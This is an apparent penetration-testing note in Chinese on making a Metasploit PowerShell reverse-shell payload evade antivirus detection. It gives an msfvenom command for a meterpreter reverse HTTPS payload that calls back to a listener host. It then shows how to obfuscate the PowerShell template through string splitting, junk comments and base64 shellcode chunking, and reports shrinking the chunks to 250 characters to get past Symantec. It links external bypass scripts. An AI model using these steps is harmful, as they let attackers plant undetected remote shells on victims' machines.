	生成
	msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.0.108 LPORT=443 -f psh-net -o shity_shellcode.ps1
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/700.png)

	先来测试一下，把ps1文件的shellcode换成一段无害的字符串
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/701.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/702.png)

	结果发现还是被查杀了
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/703.png)

	这表明大多数检测来自PowerShell模板，而不是Shellcode本身。
	下面几种bypass方法
	1.将字符串分成几部分并创建中间变量；
	2.添加大量垃圾备注；
	3.添加一些垃圾指令，例如循环或睡眠指令（对于沙盒有用）。
	[DllImport("kernel32.dll")]
	变为
	[DllImport("ke"+"rne"+"l32.dll")] #可绕过赛门铁克
	$przdE.ReferencedAssemblies.AddRange(@("System.dll",[PsObject].Assembly.Location))
	变为
	$magic="Syst"+"em"+".dll";
	$przdE.ReferencedAssemblies.AddRange(@($magic,[PsObject].Assembly.Location))
	分割shellcode
	$sc0=<shellcode的第1部分>; …$sc7=<shellcode的第8部分>; [Byte[]]$tcomplete_sc=[System.Convert]::FromBase64String($sc0+$sc1+…+$sc7)
	一些细节可参照
	https://raw.githubusercontent.com/kmkz/Pentesting/master/AV_Evasion/AV_Bypass.ps1
	我不太懂汇编语言，所以没有添加无害指令。
	这里直接使用一键生成的bash脚本，有时间的可以读读里面的命令
	https://github.com/darksh3llRU/tools/blob/master/psh-net_shellcode_fastchange.sh
	这个脚本是生成个hta的，脚本以1337个字符来分块
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/704.png)
	
	我测试的时候1337个字符会被赛门铁克查杀到，我这里修改成250个字符来分块
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/705.png)

	因为我没加汇编指令，中间这里直接按任意键跳过即可，懂的可以在开头添加一些指令，例如xor，inc，dec，add，sub，mov，nop等
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/706.png)

	执行完后会生成一些文件
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/707.png)

	我们只用final_pshnet_revhttps.ps1这个文件，打开修改一下
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/708.png)

	修改成
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/709.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/710.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/711.png)